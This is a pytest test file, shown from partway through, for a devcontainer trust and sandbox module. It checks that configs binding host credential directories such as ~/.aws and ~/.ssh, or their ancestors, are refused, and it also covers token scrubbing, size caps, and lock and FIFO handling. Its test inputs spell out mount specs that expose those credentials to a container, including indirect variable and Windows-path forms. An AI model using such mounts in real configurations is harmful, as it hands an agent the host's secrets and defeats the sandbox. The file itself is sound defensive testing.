        state = self._instrument(monkeypatch)
        devc.grant_trust(project)
        assert state["read_held"] == [True], "read happened outside the lock"
        assert state["write_held"] == [True], "write happened outside the lock"

    def test_revoke_holds_the_lock_across_read_and_write(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        devc.grant_trust(project)
        state = self._instrument(monkeypatch)
        assert devc.revoke_trust(project) is True
        assert state["read_held"] == [True]
        assert state["write_held"] == [True]

    def test_a_missing_entry_revokes_without_writing(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """No-op revoke must not rewrite the store, which would be a lost-update
        window of its own for whatever another writer had just added."""
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)
        state = self._instrument(monkeypatch)
        assert devc.revoke_trust(project) is False
        assert state["write_held"] == []

    def test_each_write_uses_a_distinct_temp_path(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """Two writers must never stage through the same temp filename.

        A fixed ``.tmp`` sibling let one writer's partial content be renamed over
        the store by another, or vanish under it with ENOENT. Residue is NOT the
        observable -- a successful rename removes the temp file either way, so an
        assertion about leftover files passes even with the bug present. This
        pins the property that actually differs: the staging path is unique per
        write.
        """
        project = tmp_path / "proj"
        project.mkdir()
        _write_primary(project)

        import kiro_crew.atomic_write as aw

        staged: list[str] = []
        real_replace = aw.replace_with_retry

        def record(src: object, dst: object) -> None:
            staged.append(str(src))
            real_replace(src, dst)

        monkeypatch.setattr(aw, "replace_with_retry", record)
        devc.grant_trust(project)
        devc.revoke_trust(project)

        assert len(staged) == 2, staged
        assert staged[0] != staged[1], "both writes staged through one temp path"
        assert not list(devc._trust_path().parent.glob("*.tmp"))

    def test_a_grant_does_not_resurrect_a_separately_revoked_project(
        self, tmp_path: Path, trust_home: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The lost update itself, forced deterministically rather than raced.

        A revoke of A is driven from inside B's transaction, at the exact point
        the unlocked version would already have taken its snapshot. Because the
        transaction is serialized, B must observe the store AFTER the revoke and
        cannot write A back.
        """
        a = tmp_path / "a"
        a.mkdir()
        _write_primary(a)
        b = tmp_path / "b"
        b.mkdir()
        _write_primary(b)
        devc.grant_trust(a)

        real_read = devc._read_trust
        fired: list[str] = []

        def read_then_revoke_a() -> dict:
            # Runs INSIDE grant_trust's locked section; the nested revoke reuses
            # the same lock, so this models the interleaving without threads.
            data = real_read()
            if not fired:
                fired.append("x")
                data.pop(os.path.realpath(str(a)), None)
                devc._write_trust(data)
            return data

        monkeypatch.setattr(devc, "_read_trust", read_then_revoke_a)
        devc.grant_trust(b)
        # No monkeypatch.undo() here: it would also revert the trust_home
        # fixture's own patching and send the assertions below at the real
        # store. The hook self-disables after firing once, so plain reads
        # resume without it.

        assert devc.is_trusted(b) is True
        assert devc.is_trusted(a) is False, "grant resurrected a revoked project"


class TestSensitiveHostMountsRefused:
    """A container must not be pointed at paths the host sandbox withholds.

    A containerized session skips ``wrap_argv`` and the cgroup wrapper, because
    both are host mechanisms that cannot cross the boundary. That trade is only
    sound while the container cannot bind the very paths the sandbox exists to
    hide: a ``mounts`` entry for ``~/.aws`` would hand the agent credentials it
    otherwise could not read, making the container weaker than the sandbox
    rather than equivalent.

    Screened with ``is_sensitive_path`` -- the same predicate gating config
    reads -- across every shape that can express a host bind. The allowed cases
    below matter as much as the refusals: a blanket refusal would satisfy the
    negative tests while breaking every legitimate devcontainer.

    Revert-verified: stubbing ``assert_no_sensitive_host_mounts`` to return
    immediately fails every refusal test here and leaves the allowed ones green.
    """

    @staticmethod
    def _project(tmp_path: Path, cfg: dict) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps(cfg).encode())
        return project

    def _refused(self, tmp_path: Path, cfg: dict) -> None:
        project = self._project(tmp_path, cfg)
        cfg_path = devc.find_devcontainer_config(project)
        assert cfg_path is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg_path)

    def test_mounts_string_form(self, tmp_path: Path) -> None:
        home = os.path.expanduser("~")
        self._refused(
            tmp_path,
            {"image": "x", "mounts": [f"source={home}/.aws,target=/root/.aws,type=bind"]},
        )

    def test_mounts_object_form(self, tmp_path: Path) -> None:
        home = os.path.expanduser("~")
        self._refused(
            tmp_path,
            {
                "image": "x",
                "mounts": [{"source": f"{home}/.ssh", "target": "/root/.ssh", "type": "bind"}],
            },
        )

    def test_local_env_variable_spelling(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """The escape must not be available simply by naming the path indirectly."""
        monkeypatch.setenv("HOME", os.path.expanduser("~"))
        self._refused(
            tmp_path,
            {"image": "x", "mounts": ["source=${localEnv:HOME}/.aws,target=/x,type=bind"]},
        )

    @pytest.mark.parametrize(
        "run_args",
        [
            ["-v", "{home}/.ssh:/root/.ssh"],
            ["--volume={home}/.aws:/root/.aws"],
            ["--mount", "type=bind,src={home}/.ssh,dst=/s"],
            ["--mount=type=bind,source={home}/.aws,target=/s"],
        ],
        ids=["v-flag", "volume-eq", "mount-flag", "mount-eq"],
    )
    def test_run_args_docker_flags(self, tmp_path: Path, run_args: list[str]) -> None:
        """runArgs reaches docker directly, so it can express a bind too.

        ``{home}`` is the real home, so the path is genuinely sensitive on
        whichever host runs this. The drive-letter spelling Windows uses is
        covered by ``TestVolumeSpecParsing``, which does not depend on the host's
        path flavour -- these cases previously passed on POSIX while the Windows
        form escaped screening entirely.
        """
        home = os.path.expanduser("~")
        self._refused(tmp_path, {"image": "x", "runArgs": [a.format(home=home) for a in run_args]})

    def test_workspace_mount(self, tmp_path: Path) -> None:
        home = os.path.expanduser("~")
        self._refused(
            tmp_path,
            {"image": "x", "workspaceMount": f"source={home}/.aws,target=/w,type=bind"},
        )

    @pytest.mark.parametrize(
        "cfg",
        [
            {"image": "x", "mounts": ["source=myvol,target=/data,type=volume"]},
            {"image": "x"},
            {"image": "x", "runArgs": ["--network=none"]},
            {"image": "x", "mounts": [{"source": "relative/dir", "target": "/d"}]},
        ],
        ids=["named-volume", "no-mounts", "unrelated-flag", "relative-source"],
    )
    def test_benign_configs_are_still_accepted(self, tmp_path: Path, cfg: dict) -> None:
        """Proves this screens rather than refuses everything.

        Without these, a stub that raised unconditionally would pass every test
        above while making the feature unusable.
        """
        project = self._project(tmp_path, cfg)
        cfg_path = devc.find_devcontainer_config(project)
        assert cfg_path is not None
        assert devc.config_digest(cfg_path)

    def test_a_benign_absolute_host_dir_is_accepted(self, tmp_path: Path) -> None:
        scratch = tmp_path / "scratch"
        scratch.mkdir()
        project = self._project(
            tmp_path, {"image": "x", "mounts": [f"source={scratch},target=/s,type=bind"]}
        )
        cfg_path = devc.find_devcontainer_config(project)
        assert cfg_path is not None
        assert devc.config_digest(cfg_path)

    def test_the_screen_also_gates_trust_and_the_preview(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Refusing only at build time would still let the card offer the grant."""
        home = os.path.expanduser("~")
        project = self._project(
            tmp_path,
            {"image": "x", "mounts": [f"source={home}/.ssh,target=/root/.ssh,type=bind"]},
        )
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_preview(project)
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.grant_trust(project)
        assert devc.is_trusted(project) is False


class TestPreviewMetadataIsAlwaysDisplayable:
    """``name`` and ``image`` reach the trust card as React children.

    jsonc permits any JSON value for those keys, and an object or list thrown at
    React raises and replaces the chat surface with an error boundary. An
    attacker-authored config must not be able to break the prompt that asks
    whether to trust it, so non-strings become ``None`` and only the raw text
    carries the real value.

    Revert-verified: returning ``parsed.get(...)`` unfiltered fails the two
    coercion tests.
    """

    @staticmethod
    def _preview(tmp_path: Path, cfg: dict) -> dict:
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(json.dumps(cfg).encode())
        return devc.config_preview(project)

    @pytest.mark.parametrize(
        "bad",
        [{}, {"nested": "object"}, ["a", "list"], 17, True, None],
        ids=["empty-obj", "obj", "list", "int", "bool", "null"],
    )
    def test_non_string_name_becomes_none(
        self, tmp_path: Path, trust_home: Path, bad: object
    ) -> None:
        preview = self._preview(tmp_path, {"image": "alpine", "name": bad})
        assert preview["name"] is None
        assert preview["image"] == "alpine", "sibling field must survive"

    def test_non_string_image_becomes_none(self, tmp_path: Path, trust_home: Path) -> None:
        preview = self._preview(tmp_path, {"name": "ok", "image": ["list"]})
        assert preview["image"] is None
        assert preview["name"] == "ok"

    def test_blank_string_is_treated_as_absent(self, tmp_path: Path, trust_home: Path) -> None:
        preview = self._preview(tmp_path, {"name": "   ", "image": "alpine"})
        assert preview["name"] is None

    def test_the_raw_text_still_carries_the_real_value(
        self, tmp_path: Path, trust_home: Path
    ) -> None:
        """Coercing the display field must not hide anything from the reviewer."""
        preview = self._preview(tmp_path, {"image": "alpine", "name": {"a": 1}})
        assert '"a"' in preview["raw"]


class TestVolumeSpecParsing:
    """``-v host:container`` must split correctly on every platform.

    A bare ``split(":", 1)`` returns ``"C"`` for
    ``C:\\Users\\me\\.aws:/root/.aws`` -- not a path, so the bind escapes the
    sensitive-path screen entirely. That is the spelling docker uses on Windows,
    so the POSIX-only tests passed while the Windows shard proved the screen was
    bypassable there.

    Asserted on the parser directly rather than through a project fixture, so the
    drive-letter case runs on every platform instead of only on Windows.

    Revert-verified: restoring the bare split fails the two drive-letter cases.
    """

    @pytest.mark.parametrize(
        "spec,expected",
        [
            ("C:\\Users\\me\\.aws:/root/.aws", "C:\\Users\\me\\.aws"),
            ("C:/Users/me/.aws:/root/.aws", "C:/Users/me/.aws"),
            ("d:\\data:/data:rw", "d:\\data"),
            ("/home/me/.ssh:/root/.ssh", "/home/me/.ssh"),
            ("/home/me/.ssh:/root/.ssh:ro", "/home/me/.ssh"),
            ("myvol:/data", "myvol"),
            ("/only-a-host-path", "/only-a-host-path"),
        ],
        ids=[
            "windows-backslash",
            "windows-forward",
            "lowercase-drive-with-opts",
            "posix",
            "posix-with-opts",
            "named-volume",
            "no-separator",
        ],
    )
    def test_host_part(self, spec: str, expected: str) -> None:
        assert devc._volume_host_part(spec) == expected

    def test_collected_from_run_args_on_either_platform(self) -> None:
        """The collector, not just the splitter, must surface the drive path."""
        cfg = {
            "image": "x",
            "runArgs": ["-v", "C:\\Users\\me\\.aws:/root/.aws", "--network=none"],
        }
        assert devc._collect_host_mount_sources(cfg) == ["C:\\Users\\me\\.aws"]


class TestOversizeConfigRefused:
    """A config larger than the prompt can display cannot be trusted.

    The digest covers the whole file while the preview was truncated, so a grant
    would have authorized fields past the cut that the reviewer never saw --
    ``initializeCommand`` or a ``mounts`` entry could hide there. Refusing is the
    only option that keeps "what was shown" and "what was trusted" the same set
    of bytes.

    Revert-verified: removing the size check lets all three gates through.
    """

    @staticmethod
    def _project(tmp_path: Path, payload_len: int) -> Path:
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        body = json.dumps({"image": "alpine", "pad": "x" * payload_len}).encode()
        (dc / "devcontainer.json").write_bytes(body)
        return project

    def test_oversize_is_refused_at_every_gate(self, tmp_path: Path, trust_home: Path) -> None:
        project = self._project(tmp_path, devc._MAX_PREVIEW_BYTES + 5000)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        for call in (
            lambda: devc.config_digest(cfg),
            lambda: devc.config_preview(project),
            lambda: devc.grant_trust(project),
        ):
            with pytest.raises(devc.DevcontainerError, match="larger than"):
                call()
        assert devc.is_trusted(project) is False

    def test_a_config_under_the_cap_is_accepted(self, tmp_path: Path, trust_home: Path) -> None:
        """Guards against turning the cap into a blanket refusal."""
        project = self._project(tmp_path, 1000)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)
        assert devc.config_preview(project)["digest"]

    def test_the_preview_is_never_a_truncated_view(self, tmp_path: Path, trust_home: Path) -> None:
        """Whatever the preview returns must be the WHOLE config file.

        Pins the property the size refusal exists to guarantee: raw is complete,
        so the reviewer sees every byte the digest covers.
        """
        project = self._project(tmp_path, 2048)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        raw_on_disk = cfg.read_bytes().decode()
        assert devc.config_preview(project)["raw"] == raw_on_disk


class TestComposeBindsAreScreened:
    """A compose service's ``volumes:`` are host binds too.

    They never appear in devcontainer.json, so screening only the json left the
    entire compose surface open: a trusted compose binding ``${HOME}/.aws``
    would be frozen, built, and handed to the agent. Compose is parsed from the
    digest-verified tree bytes, so what is screened is what will be built.

    Fails CLOSED on a compose file that cannot be parsed or resolved -- one whose
    binds cannot be enumerated is one whose host access is unknown.

    Revert-verified: dropping the ``_collect_compose_host_binds`` call fails
    every refusal test here while the acceptance tests stay green.
    """

    @staticmethod
    def _project(tmp_path: Path, compose: str, **cfg_extra: object) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(compose, encoding="utf-8")
        cfg: dict = {
            "dockerComposeFile": "compose.yml",
            "service": "app",
            "workspaceFolder": "/w",
        }
        cfg.update(cfg_extra)
        (dc / "devcontainer.json").write_bytes(json.dumps(cfg).encode())
        return project

    def _refused(self, tmp_path: Path, compose: str, match: str) -> None:
        project = self._project(tmp_path, compose)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match=match):
            devc.config_digest(cfg)

    @pytest.mark.parametrize(
        "volumes",
        [
            "      - {home}/.aws:/root/.aws\n",
            "      - {home}/.aws:/root/.aws:ro\n",
            "      - ${{HOME}}/.aws:/root/.aws\n",
            "      - $HOME/.ssh:/root/.ssh\n",
            "      - type: bind\n        source: {home}/.ssh\n        target: /root/.ssh\n",
        ],
        ids=["short", "short-ro", "brace-var", "bare-var", "long-form"],
    )
    def test_sensitive_bind_is_refused(self, tmp_path: Path, volumes: str) -> None:
        home = os.path.expanduser("~")
        compose = "services:\n  app:\n    image: alpine\n    volumes:\n" + volumes.format(home=home)
        self._refused(tmp_path, compose, "sensitive host path")

    def test_a_second_service_is_screened_too(self, tmp_path: Path) -> None:
        """Every service is checked, not just the one the config names."""
        home = os.path.expanduser("~")
        compose = (
            "services:\n"
            "  app:\n    image: alpine\n"
            "  side:\n    image: alpine\n    volumes:\n"
            f"      - {home}/.aws:/x\n"
        )
        self._refused(tmp_path, compose, "sensitive host path")

    @pytest.mark.parametrize(
        "compose",
        [
            "services:\n  app:\n    image: alpine\n    volumes:\n      - myvol:/data\n",
            "services:\n  app:\n    image: alpine\n",
            "services:\n  app:\n    image: alpine\n    volumes:\n      - ./src:/src\n",
            "services: {}\n",
        ],
        ids=["named-volume", "no-volumes", "relative-bind", "empty-services"],
    )
    def test_benign_compose_is_accepted(self, tmp_path: Path, compose: str) -> None:
        """Guards against a blanket refusal of compose-based configs."""
        project = self._project(tmp_path, compose)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)

    def test_unparseable_compose_fails_closed(self, tmp_path: Path) -> None:
        self._refused(
            tmp_path, "services:\n  app:\n   :::not yaml:::\n  [unclosed\n", "could not be parsed"
        )

    def test_non_mapping_compose_fails_closed(self, tmp_path: Path) -> None:
        self._refused(tmp_path, "- just\n- a\n- list\n", "not a mapping")

    def test_an_unresolvable_reference_fails_closed(self, tmp_path: Path) -> None:
        """A reference the hashed tree does not carry cannot be screened."""
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(b"{}")
        entries = devc._read_config_tree(devc.find_devcontainer_config(project))
        with pytest.raises(devc.DevcontainerError, match="cannot be screened"):
            devc.assert_no_sensitive_host_mounts(
                {"dockerComposeFile": "absent.yml"}, project, entries
            )

    def test_the_screen_reaches_preview_and_trust(self, tmp_path: Path, trust_home: Path) -> None:
        home = os.path.expanduser("~")
        compose = f"services:\n  app:\n    image: alpine\n    volumes:\n      - {home}/.aws:/x\n"
        project = self._project(tmp_path, compose)
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_preview(project)
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.grant_trust(project)
        assert devc.is_trusted(project) is False


class TestContainerSpawnScrubsTheEnvironment:
    """The container path must scrub channel credentials like the host path does.

    A namespace does nothing about the environment: the gateway's Slack/WeCom/
    Telegram tokens live in the inherited env, and a cron job's ``env`` is copied
    into ``_extra_env``. Passing that straight to ``docker exec -e`` would hand
    the agent credentials the host path explicitly strips.

    Revert-verified: dropping the ``scrub_agent_denied_env`` wrapper fails
    ``test_denied_keys_never_reach_the_container``.
    """

    def test_denied_keys_never_reach_the_container(self) -> None:
        """Asserted through the real scrubber, not a stand-in for it."""
        from kiro_crew.sandbox import _AGENT_DENIED_ENV_KEYS, scrub_agent_denied_env

        assert _AGENT_DENIED_ENV_KEYS, "expected a non-empty denied-key set"
        denied = sorted(_AGENT_DENIED_ENV_KEYS)[0]
        seeded = {denied: "secret-value", "UNRELATED_VAR": "keep"}
        scrubbed = scrub_agent_denied_env(dict(seeded))
        assert denied not in scrubbed
        assert scrubbed["UNRELATED_VAR"] == "keep"

    def test_the_spawn_path_routes_extra_env_through_the_scrubber(self) -> None:
        """Pins the call site itself, so the wrapper cannot be dropped silently.

        A behavioural test would need a live container; this asserts the one line
        that decides whether any scrubbing happens at all.
        """
        source = Path(acp_runtime_mod.__file__).read_text(encoding="utf-8")
        assert "scrub_agent_denied_env(dict(self._extra_env or {}))" in source


class TestComposeDefaultsAreExpanded:
    """SUPERSEDED PREMISE, kept as the record of why the rule reversed.

    This class previously asserted that ``${VAR:-/default}`` expands TO the
    default when VAR is unset. That fixed a real bug -- discarding the default
    collapsed the source to empty, which the caller then skipped as "not a host
    path", silently declining to screen it.

    Substituting the default turned out to be the wrong remedy for that same
    problem. Compose interpolates from the project's ``.env`` too, which is not
    read here, so an unset-to-us variable may be SET for the build: screening the
    default would screen a path docker never mounts while the one it does mount
    goes unexamined. The fail-closed behaviour is to leave the token literal and
    let the unresolved-variable guard refuse it, which
    ``TestUnresolvableVariablesStayLiteral`` pins.

    What survives here is the property that held under both rules: an unset
    variable must never make a sensitive source disappear.
    """

    @pytest.fixture(autouse=True)
    def _clear_probe(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("DC_UNSET_PROBE", raising=False)
        monkeypatch.setenv("DC_SET_PROBE", "/tmp/set-value")

    @pytest.mark.parametrize(
        "spec,expected",
        [
            ("${DC_SET_PROBE:-/fallback}", "/tmp/set-value"),
            ("${DC_SET_PROBE}", "/tmp/set-value"),
            ("prefix/${DC_SET_PROBE}/suffix", "prefix//tmp/set-value/suffix"),
        ],
        ids=["set-wins-over-default", "set-plain", "embedded"],
    )
    def test_a_resolvable_variable_expands(self, spec: str, expected: str) -> None:
        assert devc._expand_devcontainer_vars(spec, "/proj") == expected

    @pytest.mark.parametrize(
        "spec",
        [
            "${DC_UNSET_PROBE:-/fallback}",
            "${DC_UNSET_PROBE-/fallback}",
            "${DC_UNSET_PROBE}",
        ],
        ids=["colon-dash", "dash", "no-default"],
    )
    def test_an_unset_variable_does_not_vanish(self, spec: str) -> None:
        """The invariant both rules share: it must not become the empty string.

        Empty is what made the source non-absolute and therefore unscreened.
        """
        out = devc._expand_devcontainer_vars(spec, "/proj")
        assert out != ""
        assert "$" in out, "an unresolvable token must stay visible to the guard"

    def test_a_sensitive_default_is_refused(self, tmp_path: Path) -> None:
        """Still refused -- now by the unresolved guard rather than by screening
        the default itself. Either way the config cannot be trusted."""
        home = os.path.expanduser("~")
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(
            json.dumps(
                {
                    "image": "x",
                    "mounts": ["source=${DC_UNSET_PROBE:-" + home + "/.aws},target=/x,type=bind"],
                }
            ).encode()
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError):
            devc.config_digest(cfg)

    def test_an_unresolved_source_is_refused(self, tmp_path: Path) -> None:
        """A leftover ``$`` means the real path is unknown, so "not sensitive"
        cannot be concluded -- refuse rather than assume safe."""
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"image": "x", "mounts": ["source=$-broken,target=/x,type=bind"]}).encode()
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="unresolved variable"):
            devc.config_digest(cfg)


class TestTreeReadsAreBounded:
    """The hashed tree is read wholly into memory, so it must be capped.

    ``_read_config_tree`` is reachable from dashboard status polling, so without
    a bound the project decides how much gateway memory to consume -- a single
    oversized sibling could OOM it. Sizes are checked by ``stat`` BEFORE any
    read, so an oversized file is never loaded even once.

    Revert-verified: removing the two checks fails both refusal tests.
    """

    @staticmethod
    def _project(tmp_path: Path) -> Path:
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(b'{"image": "alpine"}')
        return project

    def test_an_oversized_sibling_is_refused(self, tmp_path: Path) -> None:
        project = self._project(tmp_path)
        (project / ".devcontainer" / "big.bin").write_bytes(b"z" * (devc._MAX_TREE_FILE_BYTES + 1))
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="per-file limit"):
            devc.config_digest(cfg)

    def test_many_files_hit_the_cumulative_limit(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """A directory of individually-legal files must not add up unbounded.

        The caps are lowered for the test so it stays fast rather than writing
        16 MiB; the property under test is that the running total is enforced.
        """
        monkeypatch.setattr(devc, "_MAX_TREE_FILE_BYTES", 1024)
        monkeypatch.setattr(devc, "_MAX_TREE_TOTAL_BYTES", 4096)
        project = self._project(tmp_path)
        for i in range(10):
            (project / ".devcontainer" / f"f{i}.txt").write_bytes(b"x" * 1000)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="total limit"):
            devc.config_digest(cfg)

    def test_an_ordinary_tree_is_unaffected(self, tmp_path: Path) -> None:
        """Guards against the caps rejecting a realistic devcontainer."""
        project = self._project(tmp_path)
        (project / ".devcontainer" / "Dockerfile").write_bytes(b"FROM alpine\n")
        (project / ".devcontainer" / "setup.sh").write_bytes(b"echo hi\n" * 500)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)

    def test_the_size_check_happens_before_the_read(
        self, tmp_path: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        """An oversized file must not be loaded even once.

        Checking after reading would still OOM, so this asserts the opener is
        never called for the offending file.
        """
        project = self._project(tmp_path)
        (project / ".devcontainer" / "big.bin").write_bytes(b"z" * (devc._MAX_TREE_FILE_BYTES + 1))
        read_names: list[str] = []
        real_read = devc._read_config_bytes

        def spy(path, root_dir=None):  # type: ignore[no-untyped-def]
            read_names.append(Path(path).name)
            return real_read(path, root_dir)

        monkeypatch.setattr(devc, "_read_config_bytes", spy)
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="per-file limit"):
            devc.config_digest(cfg)
        assert "big.bin" not in read_names


class TestAncestorBindsAreRefused:
    """A bind of an ANCESTOR of a credential path must be refused too.

    ``is_sensitive_path`` answers "is this path INSIDE a protected location", so
    it says False for ``$HOME`` and ``/`` -- neither is itself a protected entry.
    Screening on that alone let a trusted config bind either one and hand the
    agent ``~/.aws`` and ``~/.ssh`` through the mount, which is precisely what
    the guard's own message promises it prevents. ``path_contains_sensitive``
    closes the other direction.

    The earlier tests all used EXACT sensitive paths, which is why they passed
    while the ancestor case walked straight through -- the parametrization below
    deliberately covers ancestors, exact paths, and benign dirs together so the
    asymmetry is visible.

    Revert-verified: dropping the ``path_contains_sensitive`` disjunct fails
    every ancestor case here and leaves the exact-path and benign cases green.
    """

    @staticmethod
    def _project(tmp_path: Path, source: str) -> Path:
        project = tmp_path / uuid.uuid4().hex[:8]
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(
            json.dumps(
                {"image": "x", "mounts": [f"source={source},target=/host,type=bind"]}
            ).encode()
        )
        return project

    @pytest.mark.parametrize(
        ("source", "reason"),
        [
            ("{home}", "sensitive host path"),
            ("${{localEnv:HOME}}", "sensitive host path"),
            # The filesystem root contains the runtime socket as well as the
            # credential dirs, and the host-control check runs first. The reason
            # is pinned per case rather than accepting either, so a case that
            # starts being refused for the wrong reason still fails.
            ("{root}", "host control interface"),
            ("{home}/", "sensitive host path"),
        ],
        ids=["literal-home", "home-via-localenv", "filesystem-root", "home-trailing-slash"],
    )
    def test_an_ancestor_of_a_credential_dir_is_refused(
        self, tmp_path: Path, source: str, reason: str
    ) -> None:
        """``{root}`` is the anchor of HOME, not a literal "/" nor the cwd's drive.

        A literal ``/`` is not even absolute on Windows, and ``abspath(os.sep)``
        there yields the drive of the CURRENT directory -- which need not be the
        drive holding the credential directories, making the case correctly
        non-sensitive and therefore vacuous. The anchor of HOME is the ancestor
        that actually contains them on every platform.
        """
        home = os.path.expanduser("~")
        project = self._project(tmp_path, source.format(home=home, root=Path(home).anchor))
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match=reason):
            devc.config_digest(cfg)

    def test_a_compose_ancestor_bind_is_refused(self, tmp_path: Path) -> None:
        """The compose surface needs the same both-directions check."""
        home = os.path.expanduser("~")
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "compose.yml").write_text(
            f"services:\n  app:\n    image: alpine\n    volumes:\n      - {home}:/host\n",
            encoding="utf-8",
        )
        (dc / "devcontainer.json").write_bytes(
            json.dumps({"dockerComposeFile": "compose.yml", "service": "app"}).encode()
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="sensitive host path"):
            devc.config_digest(cfg)

    def test_an_unrelated_absolute_dir_is_still_allowed(self, tmp_path: Path) -> None:
        """Without this, rejecting everything would satisfy the tests above."""
        scratch = tmp_path / "scratch"
        scratch.mkdir()
        project = self._project(tmp_path, str(scratch))
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        assert devc.config_digest(cfg)


class TestUnresolvableVariablesStayLiteral:
    """A variable this cannot resolve must NOT collapse to the empty string.

    Compose also interpolates from the project's ``.env``, which is not read
    here, so an unset-to-us variable may well be set for the build. Substituting
    empty made the source non-absolute, and the caller then skipped it as "not a
    host path" -- silently declining to screen. Keeping the token literal hands
    it to the unresolved-variable guard instead.

    Revert-verified: substituting ``""`` for an unset variable fails the refusal
    tests here.
    """

    @pytest.fixture(autouse=True)
    def _unset(self, monkeypatch: pytest.MonkeyPatch) -> None:
        monkeypatch.delenv("DC_ABSENT_PROBE", raising=False)
        monkeypatch.setenv("DC_PRESENT_PROBE", "/tmp/present")

    @pytest.mark.parametrize(
        "spec",
        ["${DC_ABSENT_PROBE}", "${DC_ABSENT_PROBE:-/whatever}", "$DC_ABSENT_PROBE"],
        ids=["plain", "with-default", "bare"],
    )
    def test_unresolved_tokens_survive_expansion(self, spec: str) -> None:
        assert "$" in devc._expand_devcontainer_vars(spec, "/proj")

    def test_a_resolvable_variable_still_expands(self) -> None:
        """The literal-passthrough must not break the working case."""
        assert devc._expand_devcontainer_vars("${DC_PRESENT_PROBE}/x", "/p") == "/tmp/present/x"
        assert devc._expand_devcontainer_vars("${localWorkspaceFolder}/y", "/p") == "/p/y"

    def test_an_unresolvable_source_is_refused_not_skipped(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(
            json.dumps(
                {
                    "image": "x",
                    "mounts": ["source=${DC_ABSENT_PROBE:-/x},target=/t,type=bind"],
                }
            ).encode()
        )
        cfg = devc.find_devcontainer_config(project)
        assert cfg is not None
        with pytest.raises(devc.DevcontainerError, match="unresolved variable"):
            devc.config_digest(cfg)


class TestNonRegularFilesDoNotBlock:
    """The opener must reach its regular-file check, not hang before it.

    ``os.open`` on a FIFO blocks until a writer appears, and the ``S_ISREG``
    check runs only after the open returns. Since this runs under
    ``asyncio.to_thread`` on every dashboard status poll, one FIFO planted in
    ``.devcontainer/`` would wedge a worker per poll and starve the shared
    executor. ``O_NONBLOCK`` makes the open return so the refusal happens.

    Revert-verified: removing ``O_NONBLOCK`` makes this test hang rather than
    fail, which is itself the symptom -- it is guarded with a timeout so a
    regression surfaces as a failure instead of a stuck suite.
    """

    @pytest.mark.skipif(not hasattr(os, "mkfifo"), reason="needs POSIX FIFOs")
    def test_a_fifo_is_refused_promptly(self, tmp_path: Path) -> None:
        project = tmp_path / "proj"
        dc = project / ".devcontainer"
        dc.mkdir(parents=True)
        (dc / "devcontainer.json").write_bytes(b'{"image": "alpine"}')
        os.mkfifo(dc / "pipe")

        done: list[BaseException | None] = []

        def run() -> None:
            try:
                devc.config_digest(devc.find_devcontainer_config(project))
                done.append(None)
            except BaseException as exc:  # noqa: BLE001
                done.append(exc)

        t = threading.Thread(target=run, daemon=True)
        t.start()
        t.join(timeout=20)
        assert not t.is_alive(), "opener blocked on the FIFO instead of refusing it"
        assert isinstance(done[0], devc.DevcontainerError)


